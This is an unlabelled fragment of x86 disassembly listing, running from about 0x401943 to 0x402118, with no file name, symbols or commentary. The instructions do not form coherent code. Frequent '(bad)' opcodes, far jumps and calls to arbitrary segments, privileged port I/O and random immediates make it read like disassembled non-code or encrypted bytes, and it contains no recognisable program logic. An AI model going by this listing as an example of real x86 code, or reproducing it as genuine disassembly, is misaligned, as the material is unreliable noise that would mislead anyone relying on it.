  401943:	cmc    
  401944:	addr16 push edi
  401946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401947:	cdq    
  401948:	jne    0x401908
  40194a:	xchg   DWORD PTR [ebx+0x78],edi
  40194d:	ret    
  40194e:	xor    edx,DWORD PTR [ecx-0x77]
  401951:	dec    ebp
  401952:	ret    
  401953:	pop    esi
  401954:	push   ss
  401955:	jle    0x4019ba
  401957:	sub    BYTE PTR [eax+0x7f141081],ch
  40195d:	test   eax,0xc7ee8eb9
  401962:	cmp    ah,BYTE PTR [ebp+0x17]
  401965:	pusha  
  401966:	jmp    0x4f7e:0x62121258
  40196d:	(bad)  
  40196f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401970:	mov    bh,0xb0
  401972:	cmp    al,0x10
  401974:	cs pop eax
  401976:	push   cs
  401977:	mov    dh,0xc2
  401979:	movhlps xmm4,xmm4
  40197c:	imul   esp,eax,0xffffffdf
  40197f:	cmp    ecx,esp
  401981:	lahf   
  401982:	jp     0x4019b1
  401984:	pop    eax
  401985:	and    al,0xf
  401987:	push   ss
  401988:	call   FWORD PTR [ebx+0x126daebb]
  40198e:	(bad)  
  40198f:	ins    BYTE PTR es:[edi],dx
  401990:	clc    
  401991:	sub    BYTE PTR [ebx-0x6f73ba5a],cl
  401997:	pop    edi
  401998:	jl     0x4019d3
  40199a:	mov    ebp,0x3ed480cf
  40199f:	fnstcw WORD PTR [edi+0x22]
  4019a2:	sbb    DWORD PTR [ecx-0x492c45fe],0xffffffad
  4019a9:	lock mov bl,0xbc
  4019ac:	push   ebx
  4019ad:	adc    ecx,ecx
  4019af:	mov    DWORD PTR [edi+0x158ccba],0x17469580
  4019b9:	(bad)  
  4019ba:	push   esp
  4019bb:	out    0x58,eax
  4019bd:	inc    esi
  4019be:	addr16 xchg ebx,eax
  4019c0:	inc    edi
  4019c1:	les    ebx,FWORD PTR [esi+edi*4]
  4019c4:	sahf   
  4019c5:	cmp    edx,DWORD PTR [esi]
  4019c7:	and    eax,0xafd0e3f
  4019cc:	adc    eax,0xd5da98ad
  4019d1:	pop    es
  4019d2:	xor    al,0xed
  4019d4:	gs (bad) 
  4019d6:	pop    eax
  4019d7:	and    al,0xfe
  4019d9:	xchg   BYTE PTR [ecx-0x75d93f52],cl
  4019df:	leave  
  4019e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019e1:	frstor [edx+0xd27f370]
  4019e7:	pushf  
  4019e8:	lods   eax,DWORD PTR ds:[esi]
  4019e9:	or     eax,ecx
  4019eb:	or     BYTE PTR [ebx-0x46],ah
  4019ee:	test   BYTE PTR [eax+0x3c],bh
  4019f1:	mov    esi,0x7d8679c8
  4019f6:	sar    BYTE PTR [esi],1
  4019f8:	(bad)  [edx+0x62]
  4019fb:	push   0xffffffe7
  4019fd:	jns    0x401a09
  4019ff:	ficom  DWORD PTR [esi]
  401a01:	mov    ecx,0xf51f40e2
  401a06:	and    DWORD PTR [edx-0x5d4d2d41],esi
  401a0c:	mov    ebx,0xc7d8ef65
  401a11:	clc    
  401a12:	xor    eax,0x9fa83d93
  401a17:	or     DWORD PTR [ecx+eiz*8-0x78a932a7],ebx
  401a1e:	out    0xd4,al
  401a20:	sub    esi,DWORD PTR [esi+0x71]
  401a23:	sub    BYTE PTR [eax-0x9611974],0xb3
  401a2a:	retf   
  401a2b:	ret    
  401a2c:	or     al,0x35
  401a2e:	jnp    0x4019fd
  401a30:	jo     0x401a43
  401a32:	sbb    eax,0xc91e95d0
  401a37:	test   eax,0x7c820760
  401a3c:	sbb    ebp,DWORD PTR [ecx]
  401a3e:	inc    ecx
  401a3f:	fistp  WORD PTR [ebp-0x316f7dd4]
  401a45:	push   es
  401a46:	loop   0x4019eb
  401a48:	or     al,0xeb
  401a4a:	test   BYTE PTR [edx-0xf],bh
  401a4d:	je     0x401a7e
  401a4f:	add    DWORD PTR [ebx+0x66],edi
  401a52:	retf   0x863a
  401a55:	add    BYTE PTR [edx+0x2d],bh
  401a58:	pop    ebp
  401a59:	inc    ecx
  401a5a:	scas   eax,DWORD PTR es:[edi]
  401a5b:	retf   
  401a5c:	xor    BYTE PTR [esi],bh
  401a5e:	mov    dl,0x13
  401a60:	jb     0x401a9b
  401a62:	sub    dh,ch
  401a64:	neg    esi
  401a66:	jns    0x401a77
  401a68:	sub    DWORD PTR [ebx],edx
  401a6a:	sub    eax,DWORD PTR ds:0xf1f265f6
  401a70:	mov    DWORD PTR [ecx-0x3d5fe38a],ecx
  401a76:	ins    DWORD PTR es:[edi],dx
  401a77:	add    BYTE PTR ds:0x2eec331e,ch
  401a7d:	inc    esi
  401a7e:	cmp    BYTE PTR ss:[edi-0x5a],dh
  401a82:	push   ebx
  401a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a84:	call   0x47aa2afd
  401a89:	ret    0x41a0
  401a8c:	push   ss
  401a8d:	push   ebp
  401a8e:	adc    DWORD PTR [edx*8-0x849ca86],esp
  401a95:	lahf   
  401a96:	(bad)  
  401a97:	in     al,0x8c
  401a99:	xor    al,0x2e
  401a9b:	push   ss
  401a9c:	or     DWORD PTR [ecx],ecx
  401a9e:	shl    BYTE PTR [eax+0x10],0xf9
  401aa2:	repnz inc eax
  401aa4:	pop    eax
  401aa5:	mov    al,0x1e
  401aa7:	enter  0x8667,0x6b
  401aab:	addr16 pop es
  401aad:	imul   eax,DWORD PTR [ebx+edx*2+0x57594396],0xc1f8d38
  401ab8:	and    ah,al
  401aba:	jmp    0x2d92:0xc1ecc7e1
  401ac1:	in     eax,0xbd
  401ac3:	iret   
  401ac4:	std    
  401ac5:	lock xchg ecx,eax
  401ac7:	js     0x401b45
  401ac9:	std    
  401aca:	xor    DWORD PTR es:[ebx+0x448f9216],esp
  401ad1:	xchg   edi,eax
  401ad2:	sar    DWORD PTR es:[edi],1
  401ad5:	sub    BYTE PTR [ebp-0x1043ebbd],dl
  401adb:	jg     0x401a9d
  401add:	cmp    DWORD PTR [ebx+0x445acaab],ebx
  401ae3:	iret   
  401ae4:	pop    eax
  401ae5:	call   0xbeac:0x150c0545
  401aec:	nop
  401aed:	enter  0xd3bb,0xe4
  401af1:	fucomip st,st(6)
  401af3:	xor    bl,BYTE PTR [edi]
  401af5:	les    esp,FWORD PTR [eax+ebp*4]
  401af8:	scas   eax,DWORD PTR es:[edi]
  401af9:	test   BYTE PTR [eax],cl
  401afb:	cmp    eax,0x70cfc2c6
  401b00:	rol    BYTE PTR [edx+0x10],1
  401b03:	pop    edi
  401b04:	mov    al,0x76
  401b06:	ss mov ebp,0xd895f54
  401b0c:	js     0x401b8d
  401b0e:	xor    cl,0xc9
  401b11:	pop    ebx
  401b12:	std    
  401b13:	scas   eax,DWORD PTR es:[edi]
  401b14:	sbb    BYTE PTR [edx],0xa0
  401b17:	push   0xffffffd5
  401b19:	out    0xfb,al
  401b1b:	jnp    0x401aaf
  401b1d:	pop    esp
  401b1e:	enter  0x7fd1,0xf
  401b22:	cmp    esi,edi
  401b24:	es sub eax,0xe8ff5066
  401b2a:	jmp    0x401b82
  401b2c:	call   0x5a6061f6
  401b31:	inc    ebp
  401b32:	cli    
  401b33:	inc    BYTE PTR [edi+edx*1-0x79aa1f6b]
  401b3a:	dec    ecx
  401b3b:	test   BYTE PTR [edi+0x588a411],ch
  401b41:	cmp    ecx,DWORD PTR ds:0xe60f8d90
  401b47:	dec    ecx
  401b48:	jg     0x401b39
  401b4a:	inc    edi
  401b4b:	xchg   ebx,eax
  401b4c:	pop    esi
  401b4d:	rcl    BYTE PTR [ebp-0x67],cl
  401b50:	mov    eax,ds:0x12328969
  401b55:	out    0x8f,al
  401b57:	mov    edx,0x2954fdd0
  401b5c:	jg     0x401b34
  401b5e:	xchg   ecx,eax
  401b5f:	fcmovnu st,st(4)
  401b61:	inc    ebp
  401b62:	ror    DWORD PTR [edx-0x7965d47c],1
  401b68:	jnp    0x401b55
  401b6a:	add    ebp,DWORD PTR [di]
  401b6d:	les    eax,FWORD PTR [ebp+eax*8+0xcd03371]
  401b74:	fs cli 
  401b76:	cmp    al,0xe
  401b78:	jg     0x401b59
  401b7a:	xor    al,0xb0
  401b7c:	jle    0x401b13
  401b7e:	cmp    DWORD PTR [edx-0x5a],esi
  401b81:	dec    edi
  401b82:	sbb    BYTE PTR [ebp+edx*2+0x17c67a80],bh
  401b89:	call   0x97f6bcde
  401b8e:	jecxz  0x401b58
  401b90:	(bad)  
  401b92:	dec    edx
  401b93:	inc    esi
  401b94:	lahf   
  401b95:	lods   al,BYTE PTR ds:[esi]
  401b96:	cld    
  401b97:	scas   eax,DWORD PTR es:[edi]
  401b98:	ja     0x401b21
  401b9a:	jp     0x401b5e
  401b9c:	mov    ch,0x34
  401b9e:	and    DWORD PTR [ecx+0x49],edx
  401ba1:	jmp    0x401b8a
  401ba3:	gs std 
  401ba5:	dec    edi
  401ba6:	int3   
  401ba7:	aam    0xe6
  401ba9:	and    al,0x7d
  401bab:	or     edx,esp
  401bad:	sbb    eax,0xe49c63f1
  401bb2:	inc    eax
  401bb3:	add    al,cl
  401bb5:	add    ecx,DWORD PTR [edi+0x4905d7dd]
  401bbb:	cmc    
  401bbc:	or     esp,DWORD PTR [esi-0x282b91d9]
  401bc2:	int3   
  401bc3:	and    DWORD PTR [edi+eiz*2+0x74b9f47],0x5e2e0fe4
  401bce:	push   ss
  401bcf:	fistp  QWORD PTR [ecx]
  401bd1:	jmp    0x1c40:0x8696a437
  401bd8:	xchg   esp,eax
  401bd9:	jle    0x401c3b
  401bdb:	std    
  401bdc:	jecxz  0x401c55
  401bde:	and    eax,0x1d933743
  401be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be4:	je     0x401bf6
  401be6:	lds    ecx,FWORD PTR [edx]
  401be8:	(bad)  
  401be9:	and    esp,DWORD PTR [ecx]
  401beb:	pusha  
  401bec:	mov    ds:0xa948bb42,eax
  401bf1:	sub    al,0x2a
  401bf3:	pop    esi
  401bf4:	mov    ch,BYTE PTR [edx+0x30]
  401bf7:	inc    ecx
  401bf8:	test   eax,0x782e1001
  401bfd:	imul   ecx,DWORD PTR [eax+0x2c],0xffffffcf
  401c01:	mov    dl,0x54
  401c03:	mov    fs,WORD PTR ds:0xd725bc3d
  401c09:	jp     0x401bde
  401c0b:	mul    BYTE PTR [esi-0x1c19648e]
  401c11:	call   0xb94785ba
  401c16:	mov    ebx,0x344562e6
  401c1b:	pop    esp
  401c1c:	std    
  401c1d:	pushf  
  401c1e:	mov    dl,0xda
  401c20:	jl     0x401c5b
  401c22:	pop    esi
  401c23:	outs   dx,DWORD PTR ds:[esi]
  401c24:	call   0xb3f8:0x89420a8
  401c2b:	adc    eax,DWORD PTR [edi]
  401c2d:	pop    ebp
  401c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c2f:	js     0x401c70
  401c31:	pop    eax
  401c32:	pop    ss
  401c33:	jl     0x401bf4
  401c35:	sbb    BYTE PTR [edi],0x3f
  401c38:	mov    edi,0x9f77fd1e
  401c3d:	add    al,0x2c
  401c3f:	sub    al,0x69
  401c41:	xchg   edx,eax
  401c42:	mov    ds:0x882852aa,eax
  401c47:	jmp    0x9d8584cb
  401c4c:	dec    ebx
  401c4d:	nop
  401c4e:	xchg   DWORD PTR [ebp-0x69],ebx
  401c51:	pop    esp
  401c52:	sar    DWORD PTR [edx+0x5e1c0fc2],cl
  401c58:	xlat   BYTE PTR ds:[ebx]
  401c59:	dec    eax
  401c5a:	push   esp
  401c5b:	and    DWORD PTR [esi],ecx
  401c5d:	ja     0x401c87
  401c5f:	rcr    DWORD PTR [ebp+0x35],1
  401c62:	mov    esi,0x906785b0
  401c67:	lods   eax,DWORD PTR ds:[esi]
  401c68:	mov    eax,ds:0xd7a7d3b7
  401c6d:	sbb    al,0xdf
  401c6f:	push   ds
  401c70:	das    
  401c71:	test   BYTE PTR [ebp+0x71],al
  401c74:	dec    ebp
  401c75:	or     BYTE PTR [ebx],bl
  401c77:	test   eax,0xeeec878e
  401c7c:	popa   
  401c7d:	or     DWORD PTR [eax+0x7c],edx
  401c80:	shl    BYTE PTR [ecx-0x7c],1
  401c83:	xchg   esp,eax
  401c84:	sub    BYTE PTR [edi-0x7d],ah
  401c87:	cmp    dl,dl
  401c89:	inc    esi
  401c8a:	retf   
  401c8b:	stc    
  401c8c:	rcl    BYTE PTR [edx-0x1d],1
  401c8f:	jp     0x401c43
  401c91:	les    edi,FWORD PTR [ecx+edi*8+0x2df65712]
  401c98:	imul   esi,DWORD PTR [ecx+ebp*2+0x75c949e],0xffffffb6
  401ca0:	inc    ebx
  401ca1:	imul   ecx,ebp,0xff9af3ac
  401ca7:	pop    edx
  401ca8:	pop    edx
  401caa:	mov    dh,0xaf
  401cac:	dec    ebx
  401cad:	jmp    0x401ce2
  401caf:	rol    ebx,0x14
  401cb2:	xor    al,0x7
  401cb4:	xchg   esi,eax
  401cb5:	pop    edx
  401cb6:	in     al,dx
  401cb7:	in     al,dx
  401cb8:	pop    eax
  401cb9:	and    ecx,DWORD PTR [edi-0x58]
  401cbc:	rcl    DWORD PTR [eax-0x6e],0xf7
  401cc0:	pop    ds
  401cc1:	push   ss
  401cc2:	aas    
  401cc3:	sar    DWORD PTR [eax-0x1a9005a3],1
  401cc9:	inc    esi
  401cca:	xlat   BYTE PTR ds:[ebx]
  401ccb:	aad    0xe6
  401ccd:	(bad)  
  401cce:	add    ah,BYTE PTR ds:0xf8cbf5d2
  401cd4:	paddusw mm3,QWORD PTR [ebp+0x1c14a399]
  401cdb:	pop    esp
  401cdc:	ret    
  401cdd:	adc    al,0x26
  401cdf:	jecxz  0x401cab
  401ce1:	ret    
  401ce2:	jmp    0x6a33b26b
  401ce7:	jecxz  0x401d35
  401ce9:	push   ecx
  401cea:	inc    ebx
  401ceb:	mov    ecx,0xc4079cb9
  401cf0:	push   ds
  401cf1:	inc    edx
  401cf2:	add    ebx,DWORD PTR [esi+0x55269f0f]
  401cf8:	or     ah,BYTE PTR [edx-0x6af53c74]
  401cfe:	fdivr  st(0),st
  401d00:	dec    edx
  401d01:	adc    eax,0x6294411b
  401d06:	add    bh,dh
  401d08:	push   0xe705e2c7
  401d0d:	in     eax,dx
  401d0e:	fld    DWORD PTR [ecx+eiz*1-0x3c620f97]
  401d15:	mov    esi,0xe9dc4130
  401d1a:	les    eax,FWORD PTR [esi+0x65]
  401d1d:	and    DWORD PTR [ebp-0x25],0xffffffd6
  401d21:	push   esp
  401d22:	dec    edx
  401d23:	sbb    DWORD PTR [ebp+0x58],0xffffffa6
  401d27:	sub    DWORD PTR ss:[eiz*1-0x76666f7f],0x1f967af9
  401d33:	mov    cl,0xdb
  401d35:	sbb    BYTE PTR [ebx+0x63f425f6],cl
  401d3b:	das    
  401d3c:	shr    BYTE PTR [esi],cl
  401d3e:	call   0x65dd42e8
  401d43:	lods   al,BYTE PTR ds:[esi]
  401d44:	fdivr  DWORD PTR [ebp+0x2cd7df0a]
  401d4a:	add    ah,BYTE PTR [edi+esi*4-0x32cc515f]
  401d51:	addr16 dec edi
  401d53:	test   BYTE PTR [edx],0xab
  401d56:	xchg   esp,eax
  401d57:	sbb    al,0xc4
  401d59:	sar    DWORD PTR [esi-0xf],0x2b
  401d5d:	add    al,0x7d
  401d5f:	pop    eax
  401d60:	neg    BYTE PTR [ebp-0x5ba2f448]
  401d66:	mov    eax,ds:0x3df865ca
  401d6b:	rol    DWORD PTR [edi+0x12],1
  401d6e:	cmc    
  401d6f:	aaa    
  401d70:	repnz rol DWORD PTR [ebp+ebp*4-0x2e],0x13
  401d76:	mov    edi,0xd4426e69
  401d7b:	push   esi
  401d7c:	dec    edx
  401d7d:	adc    DWORD PTR [esi+0x2b9e28d3],ebx
  401d83:	adc    ebx,DWORD PTR [edi]
  401d85:	add    DWORD PTR [ebx],0x3feda610
  401d8b:	clc    
  401d8c:	push   edx
  401d8d:	js     0x401d55
  401d8f:	out    dx,eax
  401d90:	xor    ch,BYTE PTR [edi]
  401d92:	sbb    al,dh
  401d94:	cli    
  401d95:	daa    
  401d96:	push   ss
  401d97:	test   BYTE PTR [ebx+0x20],dh
  401d9a:	stc    
  401d9b:	in     eax,0x7d
  401d9d:	push   0x13886447
  401da2:	and    eax,DWORD PTR es:[esi+esi*8]
  401da6:	mov    ecx,0x96ebc413
  401dab:	lock loope 0x401d4d
  401dae:	stc    
  401daf:	jmp    0xf487aec0
  401db4:	pop    esi
  401db5:	jecxz  0x401e13
  401db7:	jns    0x401d9c
  401db9:	push   edi
  401dba:	dec    ebp
  401dbb:	cs pop ecx
  401dbd:	pop    edx
  401dbe:	and    BYTE PTR [edi+0x743f85fe],0xb9
  401dc5:	xchg   edi,eax
  401dc6:	push   0x77
  401dc8:	in     al,0x3a
  401dca:	dec    ecx
  401dcb:	stos   DWORD PTR es:[edi],eax
  401dcc:	and    ebx,DWORD PTR [edi+0x4e]
  401dcf:	loopne 0x401e37
  401dd1:	lods   al,BYTE PTR ds:[esi]
  401dd2:	popf   
  401dd3:	dec    ecx
  401dd4:	test   eax,0x6b785bf6
  401dd9:	mov    ebp,0xe36d949f
  401dde:	pop    eax
  401ddf:	stc    
  401de0:	push   esi
  401de1:	xlat   BYTE PTR ds:[ebx]
  401de2:	leave  
  401de3:	push   edx
  401de4:	lods   eax,DWORD PTR ds:[esi]
  401de5:	sbb    al,0x5
  401de7:	retf   
  401de8:	xchg   esp,eax
  401de9:	and    edx,DWORD PTR [esi+0x70]
  401dec:	adc    ch,BYTE PTR [ebx]
  401dee:	dec    ebx
  401def:	push   ds
  401df0:	aam    0x82
  401df2:	leave  
  401df3:	push   edi
  401df4:	sbb    al,0x3e
  401df6:	xchg   dl,cl
  401df8:	outs   dx,BYTE PTR ds:[esi]
  401df9:	inc    ecx
  401dfa:	sub    DWORD PTR [esi-0x4c],ebx
  401dfd:	mov    ebx,0x48789bfe
  401e02:	push   edi
  401e03:	adc    cl,ah
  401e05:	and    ecx,DWORD PTR [edi+eax*2-0x6e]
  401e09:	sub    ebp,DWORD PTR [ebp+0x72]
  401e0c:	loope  0x401e55
  401e0e:	mov    ds:0xc6351c12,al
  401e13:	rcl    DWORD PTR [ecx+0x5f],0x34
  401e17:	push   cs
  401e18:	icebp  
  401e19:	test   eax,0xa8de8f98
  401e1e:	imul   esp,DWORD PTR [edx],0xf431be59
  401e24:	xchg   ebp,edi
  401e26:	pop    esp
  401e27:	jnp    0x401e8c
  401e29:	clc    
  401e2a:	(bad)
  401e2d:	push   es
  401e2e:	jae    0x401e6e
  401e30:	push   es
  401e31:	retf   0xe468
  401e34:	std    
  401e35:	imul   ebx,DWORD PTR [ebx],0xffffffb0
  401e38:	retf   
  401e39:	jns    0x401e91
  401e3b:	cmp    al,0x8c
  401e3d:	cmc    
  401e3e:	sti    
  401e3f:	jecxz  0x401dcc
  401e41:	inc    ebp
  401e42:	mov    ds:0x3c8b24ec,eax
  401e47:	jle    0x401e3b
  401e49:	retf   
  401e4a:	mov    eax,0x3341a68b
  401e4f:	call   0xdef9:0x42d88544
  401e56:	sbb    DWORD PTR [esi+0x2b382bd2],0xffffff99
  401e5d:	cmp    bh,ch
  401e5f:	test   bh,al
  401e61:	retf   
  401e62:	sub    esp,DWORD PTR [edi]
  401e64:	dec    eax
  401e65:	or     dl,dl
  401e67:	add    ebx,eax
  401e69:	ret    
  401e6a:	dec    edi
  401e6b:	cwde   
  401e6c:	bound  ecx,QWORD PTR [ecx+0x5d6a9182]
  401e72:	mov    eax,0x9fb39275
  401e77:	or     DWORD PTR [ebx+eiz*2+0x15e19320],ebx
  401e7e:	scas   eax,DWORD PTR es:[edi]
  401e7f:	aas    
  401e80:	aad    0x23
  401e82:	push   edi
  401e83:	loop   0x401ec8
  401e85:	adc    eax,DWORD PTR [ecx+0x37362783]
  401e8b:	in     al,0xc2
  401e8d:	add    eax,0x5cae86e0
  401e92:	adc    bh,BYTE PTR [eax]
  401e94:	xor    eax,0x821eddf9
  401e99:	into   
  401e9a:	mov    ch,0x82
  401e9c:	xchg   edi,eax
  401e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e9e:	mov    dl,0xd8
  401ea0:	retf   
  401ea1:	fld    QWORD PTR [ebp-0xf]
  401ea4:	push   edx
  401ea5:	xchg   ebp,eax
  401ea6:	ret    0xb11
  401ea9:	push   DWORD PTR [eax+eiz*8-0x57c833f5]
  401eb0:	xor    ah,bl
  401eb2:	sub    esp,DWORD PTR [edx]
  401eb4:	ja     0x401e8c
  401eb6:	(bad)  
  401eb8:	adc    BYTE PTR [edx-0x70],0xc4
  401ebc:	sbb    esi,eax
  401ebe:	fdivr  st(3),st
  401ec0:	pop    esi
  401ec1:	push   ebp
  401ec2:	mov    ebp,0xb789a2da
  401ec7:	mov    edi,0xfcde12a
  401ecc:	scas   eax,DWORD PTR es:[edi]
  401ecd:	outs   dx,BYTE PTR ds:[esi]
  401ece:	mov    ebx,0xd9d172f5
  401ed3:	mov    cl,0x24
  401ed5:	scas   al,BYTE PTR es:[edi]
  401ed6:	fnstcw WORD PTR [eax]
  401ed8:	mov    WORD PTR [esi],cs
  401eda:	jmp    0xadc20c14
  401edf:	shl    BYTE PTR [esi+0xa],0x44
  401ee3:	xchg   ebp,eax
  401ee4:	not    BYTE PTR [edi-0x50cf71cd]
  401eea:	(bad)  [esi+eax*1-0x56]
  401eee:	jns    0x401f2c
  401ef0:	in     al,0x48
  401ef2:	pop    ds
  401ef3:	hlt    
  401ef4:	js     0x401f30
  401ef6:	mov    edi,0x7ac02da5
  401efb:	jmp    0x3cb6226c
  401f00:	test   edx,0xec2be1b5
  401f06:	adc    al,0x4f
  401f08:	mov    edi,0x3704c8d0
  401f0d:	mov    ebx,0x453edcba
  401f12:	or     al,0x40
  401f14:	call   0xf0c1fc07
  401f19:	or     esp,DWORD PTR [ebp+0x15c400ef]
  401f1f:	fild   DWORD PTR ss:[eax-0x6b6c4011]
  401f26:	push   es
  401f27:	fs mov ch,0xa3
  401f2a:	outs   dx,DWORD PTR ds:[esi]
  401f2b:	jle    0x401f0d
  401f2d:	jg     0x401f44
  401f2f:	lea    edi,[ecx]
  401f31:	push   edi
  401f32:	hlt    
  401f33:	mov    WORD PTR ds:0xbf0e95b8,es
  401f39:	add    bh,BYTE PTR ds:0x7a6d1d2b
  401f3f:	int    0xdd
  401f41:	shl    DWORD PTR [eax-0x4e],0x5c
  401f45:	stos   DWORD PTR es:[edi],eax
  401f46:	push   ss
  401f47:	inc    ebx
  401f48:	and    esi,DWORD PTR [esi]
  401f4a:	packssdw mm4,QWORD PTR cs:[esi-0x36]
  401f4f:	add    eax,0x80383fe7
  401f54:	dec    esp
  401f55:	fisub  DWORD PTR [edi+edi*1+0x2282e4eb]
  401f5c:	xchg   edx,eax
  401f5d:	je     0x401f39
  401f5f:	mov    esi,?
  401f61:	std    
  401f62:	mov    bh,BYTE PTR [eax]
  401f64:	mov    eax,ds:0x96e59133
  401f69:	ins    DWORD PTR es:[edi],dx
  401f6a:	mov    al,ds:0xcbe5fe37
  401f6f:	sbb    eax,0x98a79b4c
  401f74:	pop    ss
  401f75:	jl     0x401f16
  401f77:	adc    eax,0x73cea3fd
  401f7c:	cmp    ch,BYTE PTR [ebx]
  401f7e:	mov    ch,0xa7
  401f80:	jns    0x401fb7
  401f82:	in     al,0x45
  401f84:	pop    ecx
  401f85:	or     dh,BYTE PTR [ecx+0x38048399]
  401f8b:	mov    ah,0xbe
  401f8d:	ffree  st(5)
  401f8f:	pop    es
  401f90:	adc    BYTE PTR [esi],0x72
  401f93:	dec    eax
  401f94:	mov    eax,ds:0x532f6859
  401f99:	(bad)  
  401f9a:	stc    
  401f9b:	sbb    BYTE PTR [ebp+edi*4-0x2c],0xc7
  401fa0:	call   0x90c66d12
  401fa5:	sbb    DWORD PTR [ebx-0x5f],esi
  401fa8:	int    0xff
  401faa:	js     0x401f50
  401fac:	clc    
  401fad:	add    ebx,ebp
  401faf:	(bad)  
  401fb1:	and    eax,0xc4bb5ebb
  401fb6:	imul   edx,DWORD PTR [ecx+0x41b72ba3],0xffffffae
  401fbd:	xchg   ebp,eax
  401fbe:	and    al,0x7
  401fc0:	dec    ebx
  401fc1:	adc    DWORD PTR ds:0x35d8d712,ebp
  401fc7:	pop    eax
  401fc8:	mov    ah,0x48
  401fca:	jmp    0x402016
  401fcc:	fist   DWORD PTR [ecx]
  401fce:	mov    ebx,0x157bf94b
  401fd3:	pushf  
  401fd4:	retf   0xcaf
  401fd7:	rol    BYTE PTR [eax],0xb
  401fda:	and    esi,DWORD PTR [esi-0x5362c750]
  401fe0:	retf   0xa71a
  401fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fe4:	jmp    0x402054
  401fe6:	lds    edi,FWORD PTR [esi+0x63]
  401fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fea:	enter  0x40e0,0xe5
  401fee:	ss ret 0xc6b5
  401ff2:	das    
  401ff3:	xchg   DWORD PTR [edx-0x3f],ebx
  401ff6:	fadd   QWORD PTR [esp+edi*1-0x35]
  401ffa:	sbb    BYTE PTR [edi-0x2ce9899a],dl
  402000:	loopne 0x402016
  402002:	ds es cvtpi2ps xmm0,mm0
  402007:	aam    0x77
  402009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200a:	div    BYTE PTR [ebx]
  40200c:	jae    0x40208c
  40200e:	inc    ebx
  40200f:	pop    ds
  402010:	sahf   
  402011:	sub    eax,0xa7f2a64
  402016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402017:	aad    0xb3
  402019:	xor    al,BYTE PTR [esi]
  40201b:	popa   
  40201c:	sbb    DWORD PTR [eax-0x76],0xffffffb1
  402020:	aad    0x1f
  402022:	shl    BYTE PTR [ebx+0x43359671],cl
  402028:	pop    esp
  402029:	stc    
  40202a:	add    esi,DWORD PTR cs:[edx]
  40202d:	adc    al,0xb7
  40202f:	popa   
  402030:	push   esi
  402031:	shl    esi,cl
  402033:	cmp    esi,0xdee33aa9
  402039:	mov    ch,0xc0
  40203b:	lea    esi,[ebx-0x78e0cdf8]
  402041:	stos   DWORD PTR es:[edi],eax
  402042:	sbb    eax,0x93c2c192
  402047:	mov    ebp,DWORD PTR [ebx-0x54]
  40204a:	(bad)  
  40204c:	mov    eax,0xafa92df1
  402051:	les    esp,FWORD PTR [ecx+ebp*8]
  402054:	arpl   WORD PTR [esi+0x14],dx
  402057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402058:	mov    dh,0x2e
  40205a:	mov    al,0x84
  40205c:	ss inc ecx
  40205e:	popa   
  40205f:	mov    dl,0x28
  402061:	lods   eax,DWORD PTR ds:[esi]
  402062:	and    cl,cl
  402064:	push   0x1d566db7
  402069:	adc    BYTE PTR [ecx+esi*8+0x3a85a70f],ah
  402070:	dec    esi
  402071:	cli    
  402072:	fsqrt  
  402074:	leave  
  402075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402076:	adc    DWORD PTR [ecx],eax
  402078:	and    ecx,DWORD PTR [edi]
  40207a:	dec    ebp
  40207b:	stos   DWORD PTR es:[edi],eax
  40207c:	push   ecx
  40207d:	pop    ebp
  40207e:	xor    bh,BYTE PTR [eax]
  402080:	js     0x40209f
  402082:	xor    eax,0xda86ded5
  402087:	mov    dh,0xc5
  402089:	mov    ebp,0x127d8d3
  40208e:	lods   eax,DWORD PTR ds:[esi]
  40208f:	dec    ecx
  402090:	shl    BYTE PTR [ecx],cl
  402092:	adc    al,bh
  402094:	mov    dl,0xcf
  402096:	xchg   esp,eax
  402097:	adc    eax,0x62
  40209a:	push   edi
  40209b:	retf   0xf057
  40209e:	fisub  WORD PTR [esi]
  4020a0:	popa   
  4020a1:	out    0xfe,al
  4020a3:	fsub   DWORD PTR [eax+0x7cba5f7c]
  4020a9:	xor    DWORD PTR ds:0x181f6381,esi
  4020af:	mov    dh,0xcc
  4020b1:	in     eax,0x8b
  4020b3:	rcpps  xmm2,xmm3
  4020b6:	scas   al,BYTE PTR es:[edi]
  4020b7:	cdq    
  4020b8:	mov    ch,BYTE PTR [edi+ebp*8]
  4020bb:	or     ch,cl
  4020bd:	xchg   esp,eax
  4020be:	mov    ds:0xaadaeed4,al
  4020c3:	loop   0x402091
  4020c5:	sbb    eax,eax
  4020c7:	cmp    BYTE PTR [edx],dl
  4020c9:	aaa    
  4020ca:	push   edi
  4020cb:	and    eax,0x92e6bc99
  4020d0:	dec    BYTE PTR [esi+ebp*4+0x19]
  4020d4:	dec    ecx
  4020d5:	(bad)  
  4020d7:	xchg   edx,eax
  4020d8:	ins    BYTE PTR es:[edi],dx
  4020d9:	add    edx,eax
  4020db:	into   
  4020dc:	jg     0x40207d
  4020de:	mov    DWORD PTR [esi-0x34fb3e20],esi
  4020e4:	aas    
  4020e5:	mov    esp,0xa41dc2ec
  4020ea:	js     0x40210d
  4020ec:	mov    BYTE PTR [ecx-0x5a1382df],al
  4020f2:	int3   
  4020f3:	inc    edx
  4020f4:	fild   DWORD PTR [edi]
  4020f6:	clc    
  4020f7:	into   
  4020f8:	popa   
  4020f9:	mov    edi,0x7a33b562
  4020fe:	hlt    
  4020ff:	push   0xffffffd5
  402101:	call   0x639559e4
  402106:	into   
  402107:	mov    ah,0xf3
  402109:	push   edi
  40210a:	out    dx,eax
  40210b:	lods   eax,DWORD PTR ds:[esi]
  40210c:	stos   DWORD PTR es:[edi],eax
  40210d:	aad    0x55
  40210f:	loop   0x402169
  402111:	ss xchg ebp,eax
  402113:	sub    ebx,DWORD PTR [edi+0x7e]
  402116:	jp     0x402115
  402118:	push   cs
